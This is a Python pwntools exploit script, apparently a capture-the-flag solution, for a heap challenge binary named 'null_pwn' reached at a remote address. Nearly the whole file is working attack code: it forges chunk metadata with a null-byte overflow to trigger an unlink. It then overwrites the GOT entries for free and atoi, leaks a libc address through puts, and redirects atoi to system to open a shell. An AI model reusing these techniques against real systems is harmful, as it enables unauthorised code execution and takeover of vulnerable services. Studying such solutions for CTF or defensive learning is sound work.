# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './null_pwn'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '82.157.5.28'
    port = '50804'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(idx , size ,content = 'a'):
    cmd(1)
    sla('Index:' , idx)
    sla('of Heap :' , size)
    sa('Content?:' , content)

def delete(idx ):
    cmd(2)
    sla('Index:' , idx)

def edit(idx , content ):
    cmd(3)
    sla('Index:' , idx)
    sa('Content?:' , content)

def show(idx ):
    cmd(4)
    sla('Index:' , idx)

# one_gad = one_gadget(libc.path)

ptr_list = 0x602128
free_got = elf.got['free']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
atoi_got = elf.got['atoi']

add(0 , 0x438 )
add(1 , 0x38 )
add(2 , 0x438 )
add(3 , 0x38 )

payload = flat( 0 , 0x30 , ptr_list - 0x18,ptr_list - 0x10 , 0,0,0x30 )
edit(1 , payload + '\x40')
delete(2)

payload = flat(
    0 ,0,
    free_got ,puts_got,
    0 , atoi_got
)

edit( 1 , payload )
edit( 0 , p64(puts_plt))

delete(1)
puts_addr = l64()
libc.address = puts_addr - libc.sym['puts']
system_addr = libc.sym['system']

edit(3 , p64(system_addr))
cmd('sh\x00')

# dbg()


p.interactive()

'''
@File    :   null_pwn.py
@Time    :   2021/09/29 11:30:29
@Author  :   Niyah 
'''